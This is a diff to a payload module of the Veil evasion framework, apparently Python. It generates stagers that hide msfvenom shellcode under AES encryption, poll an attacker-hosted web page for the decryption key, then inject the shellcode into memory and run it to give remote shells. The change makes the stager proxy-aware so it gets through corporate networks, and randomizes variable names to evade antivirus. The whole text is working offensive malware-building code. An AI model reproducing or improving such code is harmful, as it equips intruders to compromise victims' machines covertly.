@@ -45,7 +45,7 @@ class Payload:
         # required options
         self.description = """AES Encrypted shellcode is decrypted upon HTTP request, injected into memory, and executed.
         [*] Usage: Deploy webserver with cloned website, activate html page hosting key at specified URL. After building payload
-        with Veil bring down hosted page. after delivery of binary stand up stagging server and watch the shells come."""
+        with Veil bring down hosted page. after delivery of binary stand up stagging server and watch the shells come. This Payload is proxy aware."""
         self.language = "python"
         self.extension = "py"
         self.rating = "Excellent"
@@ -60,7 +60,7 @@ class Payload:
                                     "SLEEP_TIME"     : ["60", "Set the sleep time between HTTP Key request"],
                                     "TARGET_SERVER"  : ["http://www.site.com/wordpress.html", "Set target URI path of the decryption key"],
                                     "HTML_FILE_PATH" : ["/root/Desktop/", "Set the output of HTML file name"],
-				    "USER_AGENT"     : ["Mozilla/4.0", "Set your custom useragent"]
+                                    "USER_AGENT"     : ["Mozilla/4.0", "Set your custom useragent"]
 				 }
 
 
@@ -69,7 +69,7 @@ class Payload:
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
                 TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
                 target_html_file = str(TARGET_SERVER.split('/')[-1])
-		USER_AGENT = "'User-agent', '" + self.required_options['USER_AGENT'][0]
+                USER_AGENT = "'User-agent', '" + self.required_options['USER_AGENT'][0]
 
 
                 # Generate Shellcode Using msfvenom
@@ -85,6 +85,8 @@ class Payload:
                 RandDecodedShellcode = helpers.randomString()
                 RandShellCode = helpers.randomString()
                 RandPadding = helpers.randomString()
+                Proxy_var = helpers.randomString()
+                Opener_var = helpers.randomString()
 
                 # Define Random Variable Names for HTTP functions
                 RandResponse = helpers.randomString()
@@ -155,18 +157,22 @@ class Payload:
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
                 PayloadCode += 'import urllib2\n'
-                PayloadCode += 'opener = urllib2.build_opener()\n'
-                PayloadCode += 'opener.addheaders' + ' = ' '[('+ USER_AGENT +'\')]' '\n'
+                # Cause requests to go through a proxy, if proxy is availiable. This reads environment variables than reg values.
+                PayloadCode += Proxy_var + ' = urllib2.ProxyHandler()\n'
+                # Build and pass the proxy var
+                PayloadCode += Opener_var + ' = urllib2.build_opener(' + Proxy_var +')\n'
+                # Add User Agent header, instead of defult "Python" User agent
+                PayloadCode += Opener_var + '.addheaders' + ' = ' '[('+ USER_AGENT +'\')]' '\n'
                 # Define Target Server "Key hosting server"
                 PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
-                PayloadCode += '  ' + RandResponse + '= opener.open('+ RandKeyServer +') \n'
+                PayloadCode += '  ' + RandResponse + '= '+ Opener_var +'.open('+ RandKeyServer +') \n'
                 # Check to see if server returns a 200 code or if not its most likely a 400 code
                 PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                 # Opening and requesting HTML from Target Server
-                PayloadCode += '   '+ RandHttpKey + ' = opener.open('+ RandKeyServer +').read()\n'
+                PayloadCode += '   '+ RandHttpKey + ' = '+ Opener_var +'.open('+ RandKeyServer +').read()\n'
                 PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                 PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                 # Genrate MD5 hash of HTML on page
@@ -178,7 +184,7 @@ class Payload:
                 # Break out to decryption
                 PayloadCode += '   break\n'
                 # At any point it fails you will be in sleep for supplied time
-                PayloadCode += ' except URLError, e:\n'
+                PayloadCode += ' except urllib2.URLError, e:\n'
                 PayloadCode += '  time.sleep('+ self.required_options["SLEEP_TIME"][0] +')\n'
                 PayloadCode += '  pass\n'
                 # Execute Shellcode inject
@@ -201,7 +207,7 @@ class Payload:
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
                 TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
                 target_html_file = str(TARGET_SERVER.split('/')[-1])
-		USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
+                USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
 
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate(self.required_options)
@@ -219,6 +225,8 @@ class Payload:
                 RandToday = helpers.randomString()
                 RandExpire = helpers.randomString()
                 HeapVar = helpers.randomString()
+                Proxy_var = helpers.randomString()
+                Opener_var = helpers.randomString()
 
                 # Define Random Variable Names for HTTP functions
                 RandResponse = helpers.randomString()
@@ -289,18 +297,19 @@ class Payload:
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
                 PayloadCode += 'import urllib2\n'
-                PayloadCode += 'opener = urllib2.build_opener()\n'
-                PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'                
+                PayloadCode += Proxy_var + ' = urllib2.ProxyHandler()\n'
+                PayloadCode += Opener_var + ' = urllib2.build_opener(' + Proxy_var +')\n'
+                PayloadCode += Opener_var + '.addheaders' + ' = ' '[('+ USER_AGENT +'\')]' '\n'           
                 # Define Target Server "Key hosting server"
                 PayloadCode += RandKeyServer + ' = ' '"'+ TARGET_SERVER +'"' '\n'
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
-                PayloadCode += '  ' + RandResponse + '= opener.open('+ RandKeyServer +') \n'
+                PayloadCode += '  ' + RandResponse + '= '+ Opener_var +'.open('+ RandKeyServer +') \n'
                 # Check to see if server returns a 200 code or if not its most likely a 400 code
                 PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                 # Opening and requesting HTML from Target Server
-                PayloadCode += '   '+ RandHttpKey + ' = opener.open('+ RandKeyServer +').read()\n'
+                PayloadCode += '   '+ RandHttpKey + ' = '+ Opener_var +'.open('+ RandKeyServer +').read()\n'
                 PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                 PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                 # Genrate MD5 hash of HTML on page
@@ -312,7 +321,7 @@ class Payload:
                 # Break out to decryption
                 PayloadCode += '   break\n'
                 # At any point it fails you will be in sleep for supplied time
-                PayloadCode += ' except URLError, e:\n'
+                PayloadCode += ' except urllib2.URLError, e:\n'
                 PayloadCode += '  time.sleep('+ self.required_options["SLEEP_TIME"][0] +')\n'
                 PayloadCode += '  pass\n'
                 # Execute Shellcode inject
@@ -337,7 +346,7 @@ class Payload:
             if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
                 TARGET_SERVER = str(self.required_options["TARGET_SERVER"][0])
                 target_html_file = str(TARGET_SERVER.split('/')[-1])
-                USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
+		USER_AGENT = "User-Agent: " + self.required_options['USER_AGENT'][0]
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate(self.required_options)
 
@@ -354,6 +363,8 @@ class Payload:
                 RandShellcode = helpers.randomString()
                 RandReverseShell = helpers.randomString()
                 RandMemoryShell = helpers.randomString()
+                Proxy_var = helpers.randomString()
+                Opener_var = helpers.randomString()
 
                 # Define Random Variable Names for HTTP functions
                 RandResponse = helpers.randomString()
@@ -423,9 +434,9 @@ class Payload:
                 PayloadCode += 'import os\n'
                 PayloadCode += 'import time\n'
                 PayloadCode += 'import md5\n'
-                PayloadCode += 'import urllib2\n'
-                PayloadCode += 'opener = urllib2.build_opener()\n'
-                PayloadCode += 'opener.addheaders' + ' = ' '"'+ USER_AGENT +'"' '\n'            
+                PayloadCode += Proxy_var + ' = urllib2.ProxyHandler()\n'
+                PayloadCode += Opener_var + ' = urllib2.build_opener(' + Proxy_var +')\n'
+                PayloadCode += Opener_var + '.addheaders' + ' = ' '[('+ USER_AGENT +'\')]' '\n'           
                 PayloadCode += 'from datetime import datetime\n'
                 PayloadCode += 'from datetime import date\n\n'
                 # Define Target Server "Key hosting server"
@@ -433,11 +444,11 @@ class Payload:
                 PayloadCode += 'while True:\n'
                 PayloadCode += ' try:\n'
                 # Open Target Server with HTTP GET request
-                PayloadCode += '  ' + RandResponse + '= opener.open('+ RandKeyServer +') \n'
+                PayloadCode += '  ' + RandResponse + '= '+ Opener_var +'.open('+ RandKeyServer +') \n'
                 # Check to see if server returns a 200 code or if not its most likely a 400 code
                 PayloadCode += '  if ' + RandResponse + '.code == 200:\n'
                 # Opening and requesting HTML from Target Server
-                PayloadCode += '   '+ RandHttpKey + ' = opener.open('+ RandKeyServer +').read()\n'
+                PayloadCode += '   '+ RandHttpKey + ' = '+ Opener_var +'.open('+ RandKeyServer +').read()\n'
                 PayloadCode += '   '+ RandMD5 +' = md5.new()\n'
                 PayloadCode += '   '+ RandHttpKey + ' = str(' + RandHttpKey + ')\n'
                 # Genrate MD5 hash of HTML on page
@@ -449,7 +460,7 @@ class Payload:
                 # Break out to decryption
                 PayloadCode += '   break\n'
                 # At any point it fails you will be in sleep for supplied time
-                PayloadCode += ' except URLError, e:\n'
+                PayloadCode += ' except urllib2.URLError, e:\n'
                 PayloadCode += '  time.sleep('+ self.required_options["SLEEP_TIME"][0] +')\n'
                 PayloadCode += '  pass\n'
                 PayloadCode += RandPadding + ' = \'{\'\n'
